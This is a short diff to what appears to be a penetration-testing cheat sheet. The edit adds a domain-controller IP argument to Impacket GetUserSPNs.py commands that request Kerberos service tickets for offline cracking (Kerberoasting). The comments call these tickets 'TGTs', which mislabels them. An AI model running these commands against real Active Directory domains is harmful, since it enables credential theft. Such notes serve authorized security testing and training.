@@ -69,7 +69,7 @@ GetUserSPNs.py -dc-ip <DC IP> <domain>/<user>    #query the DC
 Dump TGT
 
 ```
-GetUserSPNs.py <domain>/<user>:<pass> -request  #dump TGTs of current user
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC IP> -request  #dump TGTs of current user
 GetUserSPNs.py -dc-ip <DC IP> <domain>/<user> -request-user <target user> #dump TGTs of target user
 ```
 
